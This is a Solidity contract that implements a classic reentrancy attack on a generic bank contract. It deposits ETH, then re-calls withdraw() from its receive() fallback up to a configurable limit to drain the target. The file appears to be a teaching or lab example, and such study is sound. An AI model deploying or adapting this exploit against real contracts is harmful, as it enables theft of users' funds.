// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract reentrancy{
    IBank public target;

    uint256 public reentryCount;
    uint256 public maxReentries = 10;
    bool public attackInProgress;

    event AttackStarted(uint256 amount);
    event Reentered(uint256 count, uint256 contractBalance);
    event AttackFinished(uint256 finalBalance);

    constructor(address _target) {
        target = IBank(_target);
    }

    function setMaxReentries(uint256 _max) external {
        maxReentries = _max;
    }

    function simulateAttack() external payable {
        require(msg.value > 0, "Send ETH");

        attackInProgress = true;
        emit AttackStarted(msg.value);

        target.deposit{value: msg.value}();
        target.withdraw();

        attackInProgress = false;

        emit AttackFinished(address(this).balance);
    }

    receive() external payable {
        if (attackInProgress && reentryCount < maxReentries) {
            reentryCount++;
            emit Reentered(reentryCount, address(target).balance);
            target.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}